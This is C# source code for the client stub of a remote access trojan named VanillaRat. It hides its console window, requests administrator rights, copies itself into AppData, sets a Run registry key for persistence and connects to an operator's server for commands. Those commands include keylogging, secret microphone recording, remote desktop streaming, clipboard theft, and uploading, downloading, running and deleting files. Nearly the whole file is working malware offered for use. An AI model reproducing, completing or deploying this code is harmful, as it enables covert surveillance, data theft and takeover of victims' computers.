using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telepathy;
using VanillaRatStub.Forms;
using VanillaRatStub.InformationHelpers;
using static System.Windows.Forms.Application;
using Message = Telepathy.Message;
using ThreadState = System.Threading.ThreadState;
using Timer = System.Threading.Timer;

namespace VanillaRatStub
{
    internal class Program
    {
        private const int SW_HIDE = 0; //Hide console
        private const int SW_SHOW = 5; //Show console
        private const uint ATTACH_PARENT_PROCESS = 0x0ffffffff; //Attach console back to parent process
        private static string CurrentDirectory = string.Empty;
        private static bool ARActive;
        private static bool ReceivingFile;
        private static string FileToWrite = "";
        private static int UpdateInterval;        
        private static bool CActive;
        private static bool APDisabled;
        private static Thread ChatThread = new Thread(OpenChatForm);
        private static ChatInterface CI;
        private static readonly string InstallDirectory =
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" +
            AppDomain.CurrentDomain.FriendlyName;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AttachConsole(uint dwProcessId);

        #region Connection & Data Loop

        //Try to connect to main server
        private static void Connect()
        {
            while (!Networking.MainClient.Connected)
            {
                Thread.Sleep(20);
                Networking.MainClient.Connect(ClientSettings.DNS, Convert.ToInt16(ClientSettings.Port));
            }

            while (Networking.MainClient.Connected)
            {
                Thread.Sleep(UpdateInterval);
                GetRecievedData();
            }
        }

        #endregion Connection & Data Loop

        #region Entry Point

        //Check if it is installed
        private static bool IsInstalled()
        {
            if (ExecutablePath == InstallDirectory)
                return true;
            return false;
        }

        //Raise to admin
        private static void RaisePerms()
        {
            Process P = new Process();
            P.StartInfo.FileName = ExecutablePath;
            P.StartInfo.UseShellExecute = true;
            P.StartInfo.Verb = "runas";
            P.Start();
            Environment.Exit(0);
        }

        //Check if admin
        private static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }

        //Check settings and start connect
        private static void Main(string[] args)
        {
            UpdateInterval = Convert.ToInt16(ClientSettings.UpdateInterval);
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            FreeConsole();
            ShowWindow(handle, SW_SHOW);
            EnableVisualStyles();
            CI = new ChatInterface();
            if (ClientSettings.Install == "True" && !IsInstalled())
            {
                if (!IsAdmin())
                    RaisePerms();
                if (!IsInstalled())
                {
                    File.Copy(ExecutablePath, InstallDirectory, true);
                    Process.Start(InstallDirectory);
                    Environment.Exit(0);
                }
                else
                {
                    if (ClientSettings.Startup == "True")
                    {
                        RegistryKey RK =
                            Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        try
                        {
                            RK.DeleteValue("VCLIENT", false);
                        }
                        catch
                        {
                        }

                        try
                        {
                            RK.SetValue("VCLIENT", ExecutablePath);
                        }
                        catch
                        {
                        }
                    }
                }
            }

            Connect();
            Console.ReadKey();
        }

        //Uninstall client
        private static void UninstallClient()
        {
            try
            {
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue("VCLIENT", false);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }

        #endregion Entry Point

        #region Data Handler & Grabber

        //Get data sent to client
        private static void GetRecievedData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add(2); //Client Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add(14); //AntiVirus Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
                        Networking.MainClient.Send(ToSend.ToArray());
                        string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                            .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                        ToSend.Clear();
                        ToSend.Add(15); //Operating System Tag
                        ToSend.AddRange(Encoding.ASCII.GetBytes(OperatingSystemUnDetailed));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        Console.WriteLine("Disconnected");
                        Connect();
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        //Handle data sent to client
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private static void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    File.WriteAllBytes(FileToWrite, RawData);
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }

                ReceivingFile = false;
                return;
            }
            string StringForm = string.Empty;
            try
            {
                StringForm = Encoding.ASCII.GetString(RawData);
                Console.WriteLine("Command Recieved From " + ClientSettings.DNS + "   (" + StringForm + ")");
            }
            catch
            {
            }

            if (StringForm == "KillClient")
            {
                if (ChatThread.ThreadState == ThreadState.Running)
                {
                    CloseChatForm();
                }
                UninstallClient();
                try
                {
                    Process.GetCurrentProcess().Kill();
                } catch { Environment.Exit(0); }
            }
            else if (StringForm == "DisconnectClient")
            {
                Networking.MainClient.Disconnect();
            }
            else if (StringForm == "ShowClientConsole")
            {
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_SHOW);
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Console has been shown to client."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("MsgBox"))
            {
                string ToBreak = GetSubstringByString("(", ")", StringForm);
                string Text = GetSubstringByString("<", ">", ToBreak);
                string Header = GetSubstringByString("[", "]", ToBreak);
                string ButtonString = GetSubstringByString("{", "}", ToBreak);
                string IconString = GetSubstringByString("/", @"\", ToBreak);
                MessageBoxButtons MBB = MessageBoxButtons.OK;
                MessageBoxIcon MBI = MessageBoxIcon.None;

                #region Button & Icon conditional statements

                if (ButtonString.Equals("Abort Retry Ignore"))
                    MBB = MessageBoxButtons.AbortRetryIgnore;
                else if (ButtonString.Equals("OK"))
                    MBB = MessageBoxButtons.OK;
                else if (ButtonString.Equals("OK Cancel"))
                    MBB = MessageBoxButtons.OKCancel;
                else if (ButtonString.Equals("Retry Cancel"))
                    MBB = MessageBoxButtons.RetryCancel;
                else if (ButtonString.Equals("Yes No"))
                    MBB = MessageBoxButtons.YesNo;
                else if (ButtonString.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

                if (IconString.Equals("Asterisk"))
                    MBI = MessageBoxIcon.Asterisk;
                else if (IconString.Equals("Error"))
                    MBI = MessageBoxIcon.Error;
                else if (IconString.Equals("Exclamation"))
                    MBI = MessageBoxIcon.Exclamation;
                else if (IconString.Equals("Hand"))
                    MBI = MessageBoxIcon.Hand;
                else if (IconString.Equals("Information"))
                    MBI = MessageBoxIcon.Information;
                else if (IconString.Equals("None"))
                    MBI = MessageBoxIcon.None;
                else if (IconString.Equals("Question"))
                    MBI = MessageBoxIcon.Question;
                else if (IconString.Equals("Stop"))
                    MBI = MessageBoxIcon.Stop;
                else if (IconString.Equals("Warning")) MBI = MessageBoxIcon.Warning;

                #endregion Button & Icon conditional statements

                MessageBox.Show(Text, Header, MBB, MBI);
            }
            else if (StringForm.Equals("StartRD"))
            {
                RemoteDesktopStream.Start();
            }
            else if (StringForm.Equals("StopRD"))
            {
                RemoteDesktopStream.Stop();
            }
            else if (StringForm.Equals("GetProcesses"))
            {
                Process[] PL = Process.GetProcesses();
                List<string> ProcessList = new List<string>();
                foreach (Process P in PL)
                    ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
                string[] StringArray = ProcessList.ToArray<string>();
                List<byte> ToSend = new List<byte>();
                ToSend.Add(3); //Process List Type
                string ListString = "";
                foreach (string Process in StringArray) ListString += "][" + Process;
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Contains("EndProcess("))
            {
                string ToEnd = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process P = Process.GetProcessById(Convert.ToInt16(ToEnd));
                    string Name = P.ProcessName;
                    P.Kill();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("OpenWebsite("))
            {
                string ToOpen = GetSubstringByString("(", ")", StringForm);
                try
                {
                    Process.Start(ToOpen);
                }
                catch
                {
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("GetComputerInfo"))
            {
                string ListString = "";
                List<string> ComputerInfoList = new List<string>();
                ComputerInfo.GetGeoInfo();
                ComputerInfoList.Add("Computer Name: " + ComputerInfo.GetName());
                ComputerInfoList.Add("Computer CPU: " + ComputerInfo.GetCPU());
                ComputerInfoList.Add("Computer GPU: " + ComputerInfo.GetGPU());
                ComputerInfoList.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
                ComputerInfoList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
                ComputerInfoList.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
                ComputerInfoList.Add("Country: " + ComputerInfo.GeoInfo.Country);
                ComputerInfoList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
                ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
                foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
                List<byte> ToSend = new List<byte>();
                ToSend.Add(4); //Information Type
                ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (StringForm.Equals("RaisePerms"))
            {
                Process P = new Process();
                P.StartInfo.FileName = ExecutablePath;
                P.StartInfo.UseShellExecute = true;
                P.StartInfo.Verb = "runas";
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification Type
                ToSend.AddRange(Encoding.ASCII.GetBytes("Client is restarting in administration mode."));
                P.Start();
                Networking.MainClient.Send(ToSend.ToArray());
                Environment.Exit(0);
            }
            else if (StringForm.Contains("GetDF{"))
            {
                try
                {
                    string Directory = GetSubstringByString("{", "}", StringForm);
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    CurrentDirectory = Directory;
                    ToSend.Clear();
                    ToSend.Add(6); //Current Directory Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GoUpDir"))
            {
                try
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(7); //Directory Up Type
                    CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                    ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("GetFile"))
            {
                try
                {
                    string FileString = GetSubstringByString("{", "}", StringForm);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(8); //File Type
                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch (Exception EX)
                {
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1);
                    ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
            else if (StringForm.Contains("StartFileReceive{"))
            {
                try
                {
                    FileToWrite = GetSubstringByString("{", "}", StringForm);
                    var Stream = File.Create(FileToWrite);
                    Stream.Close();
                    ReceivingFile = true;
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("TryOpen{"))
            {
                string ToOpen = GetSubstringByString("{", "}", StringForm);
                try
                {
                    Process.Start(ToOpen);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Contains("DeleteFile{"))
            {
                try
                {
                    string ToDelete = GetSubstringByString("{", "}", StringForm);
                    File.Delete(ToDelete);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                    Networking.MainClient.Send(ToSend.ToArray());
                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    ToSend.Clear();
                    ToSend.Add(5); //File List Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("GetClipboard"))
            {
                try
                {
                    string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                    Thread STAThread = new Thread(
                        delegate ()
                        {
                            if (Clipboard.ContainsText(TextDataFormat.Text))
                                ClipboardText = Clipboard.GetText(TextDataFormat.Text);
                        });
                    STAThread.SetApartmentState(ApartmentState.STA);
                    STAThread.Start();
                    STAThread.Join();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(9); //Clipboard Text Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch
                {
                }
            }
            else if (StringForm.Equals("StartUsageStream"))
            {
                HardwareUsageStream.Start();
            }
            else if (StringForm.Equals("StopUsageStream"))
            {
                HardwareUsageStream.Stop();
            }
            else if (StringForm.Equals("StartKL"))
            {
                KeyloggerStream.Start();
            }
            else if (StringForm.Equals("StopKL"))
            {
                KeyloggerStream.Stop();
            }
            else if (StringForm.Equals("StartAR"))

            {
                if (!ARActive)
                    RecordAudio();
            }
            else if (StringForm.Equals("StopAR"))
            {
                if (ARActive)
                    StopRecordAudio();
            } else if (StringForm.Equals("OpenChat"))
            {
                if (!CActive)
                {
                    CActive = true;                
                    CI = new ChatInterface();
                    ChatThread.Start();
                }
            } else if (StringForm.Equals("CloseChat"))
            {
                if (CActive)
                {
                    CActive = false;
                    Networking.ChatClosing = true;
                    Thread.Sleep(200);
                    CloseChatForm();
                }
            } else if (StringForm.Contains("[<MESSAGE>]"))
            {
                Networking.CurrentMessage = StringForm.Replace("[<MESSAGE>]", "");
            } else if (StringForm.Equals("ToggleAntiProcess"))
            {
                if (!APDisabled)
                {
                    APDisabled = true;
                    AntiProcess.StartBlock();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("Started Anti-Process."));
                    Networking.MainClient.Send(ToSend.ToArray());
                } else if (APDisabled)
                {
                    APDisabled = false;
                    AntiProcess.StopBlock();
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(1); //Notification Type
                    ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped Anti-Process."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
        }

        #region Audio Recorder

        //Record Audio
        public static string AudioPath =
            Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";

        private static void RecordAudio()
        {
            try
            {
                if (!ARActive)
                {
                    Record("open new Type waveaudio Alias recsound", "", 0, 0);
                    Record("record recsound", "", 0, 0);
                    if (File.Exists(AudioPath))
                        File.Delete(AudioPath);
                    ARActive = true;
                }
            }
            catch { }
        }

        //Stop recording audio
        private static void StopRecordAudio()
        {
            try
            {
                if (ARActive)
                {
                    Record("save recsound " + AudioPath, "", 0, 0);
                    Record("close recsound", "", 0, 0);
                    Thread.Sleep(100);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(AudioPath, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add(13); //Audio Recording Type
                    ToSend.AddRange(FileBytes);
                    Networking.MainClient.Send(ToSend.ToArray());
                    File.Delete(AudioPath);
                    ARActive = false;
                }
            }
            catch { }
        }

        #endregion Audio Recorder

        #region Chat

        //Close chat form
        [SecurityPermissionAttribute(SecurityAction.Demand, ControlThread = true)]
        private static void CloseChatForm()
        {
            try
            {               
                ChatThread.Abort();
                Thread.Sleep(100);
                ChatThread = new Thread(OpenChatForm);
                CI = new ChatInterface();
            }
            catch 
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(1); //Notification type 
                ToSend.AddRange(Encoding.ASCII.GetBytes("The clients chat could not be closed. Try again."));
                Networking.MainClient.Send(ToSend.ToArray());
            }           
        }

        //Open chat form
        private static void OpenChatForm()
        {
            try
            {
                CI.ShowDialog();
                Run(CI);
            }
            catch 
            {

            }          
        }
        #endregion

        private static string GetSubstringByString(string a, string b, string c)
        {
            return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
        }

        #endregion Data Handler & Grabber
    }
}